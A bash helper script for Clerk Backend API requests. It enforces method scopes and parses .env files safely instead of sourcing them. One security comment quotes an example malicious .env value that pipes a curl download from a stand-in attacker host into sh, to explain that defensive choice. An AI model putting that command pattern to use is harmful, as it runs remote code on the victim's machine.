#!/usr/bin/env bash

# Execute a Clerk Backend API request with scope enforcement.
#
# Usage: bash execute-request.sh [--admin] <METHOD> <PATH> [BODY]
#
# Scope enforcement:
#   GET     — always allowed
#   POST, PUT, PATCH — requires CLERK_BAPI_SCOPES="write" or --admin flag
#   DELETE  — requires CLERK_BAPI_SCOPES="write,delete" or --admin flag

set -euo pipefail

# Walk up from $PWD to find .env/.env.local (mirrors Clerk CLI behavior).
# Stops at the first directory that provides CLERK_SECRET_KEY.
#
# SECURITY: .env files are PARSED, never sourced. `source`/`.` would execute the
# file as a shell script — a stray or malicious .env in any ancestor directory
# (e.g. `CLERK_SECRET_KEY=$(curl attacker|sh)`) would run arbitrary code. We only
# extract the specific KEY=VALUE pairs this script needs, and never evaluate the
# values. The walk is also bounded to the git repo root (falling back to $HOME)
# so we don't reach into unrelated parent directories or the filesystem root.

# Extract a single variable from a .env file without executing it.
# Matches `KEY=value` or `export KEY=value`, last definition wins, and strips a
# single layer of surrounding single/double quotes. Values are treated as
# literal text — no command substitution or expansion is performed.
_read_env_var() {
  local file="$1" key="$2" line val
  line=$(grep -E "^[[:space:]]*(export[[:space:]]+)?${key}=" "$file" 2>/dev/null | tail -n1) || return 1
  [[ -z "$line" ]] && return 1
  val="${line#*=}"
  val="${val%$'\r'}"           # strip trailing CR from CRLF files
  if [[ "$val" == \"*\" ]]; then
    val="${val#\"}"; val="${val%\"}"
  elif [[ "$val" == \'*\' ]]; then
    val="${val#\'}"; val="${val%\'}"
  fi
  printf '%s' "$val"
}

# Bound the upward walk: stop at the git repo root, or $HOME, whichever we hit.
_repo_root="$(git -C "$PWD" rev-parse --show-toplevel 2>/dev/null || true)"
_walk_stop="${_repo_root:-$HOME}"

_dir="$PWD"
while true; do
  for _envfile in "$_dir/.env" "$_dir/.env.local"; do
    if [[ -f "$_envfile" ]]; then
      for _key in CLERK_SECRET_KEY CLERK_BAPI_SCOPES CLERK_REST_API_URL; do
        # Don't overwrite a value already provided by a real environment
        # variable or a closer (deeper) .env file.
        if [[ -z "${!_key:-}" ]]; then
          _val="$(_read_env_var "$_envfile" "$_key")" && [[ -n "$_val" ]] && export "$_key=$_val"
        fi
      done
    fi
  done
  [[ -n "${CLERK_SECRET_KEY:-}" ]] && break
  [[ "$_dir" == "$_walk_stop" ]] && break
  _parent="$(dirname "$_dir")"
  [[ "$_parent" == "$_dir" ]] && break
  _dir="$_parent"
done
unset -f _read_env_var
unset _dir _parent _envfile _key _val _repo_root _walk_stop

# Parse --admin flag
ADMIN=false
if [[ "${1:-}" == "--admin" ]]; then
  ADMIN=true
  shift
fi

METHOD="${1:?Usage: execute-request.sh [--admin] <METHOD> <PATH> [BODY]}"
PATH_ARG="${2:?Usage: execute-request.sh [--admin] <METHOD> <PATH> [BODY]}"
BODY="${3:-}"

METHOD_UPPER=$(echo "$METHOD" | tr '[:lower:]' '[:upper:]')
SCOPES="${CLERK_BAPI_SCOPES:-}"

# Scope check
if [[ "$ADMIN" == false ]]; then
  case "$METHOD_UPPER" in
    GET)
      ;; # always allowed
    POST|PUT|PATCH)
      if [[ "$SCOPES" != *"write"* ]]; then
        echo "ERROR: $METHOD_UPPER requests require CLERK_BAPI_SCOPES=\"write\" or --admin flag." >&2
        echo "Current CLERK_BAPI_SCOPES: \"$SCOPES\"" >&2
        exit 1
      fi
      ;;
    DELETE)
      if [[ "$SCOPES" != *"write"* ]] || [[ "$SCOPES" != *"delete"* ]]; then
        echo "ERROR: DELETE requests require CLERK_BAPI_SCOPES=\"write,delete\" or --admin flag." >&2
        echo "Current CLERK_BAPI_SCOPES: \"$SCOPES\"" >&2
        exit 1
      fi
      ;;
    *)
      echo "ERROR: Unknown HTTP method: $METHOD_UPPER" >&2
      exit 1
      ;;
  esac
fi

# Base URL: use CLERK_REST_API_URL if set, otherwise default to production
BASE_URL="${CLERK_REST_API_URL:-https://api.clerk.com}"

# Build curl command
CURL_ARGS=(
  -s
  -X "$METHOD_UPPER"
  "${BASE_URL}/v1${PATH_ARG}"
  -H "Authorization: Bearer ${CLERK_SECRET_KEY:?CLERK_SECRET_KEY is not set}"
  -H "Content-Type: application/json"
)

if [[ -n "$BODY" ]]; then
  CURL_ARGS+=(-d "$BODY")
fi

curl "${CURL_ARGS[@]}"
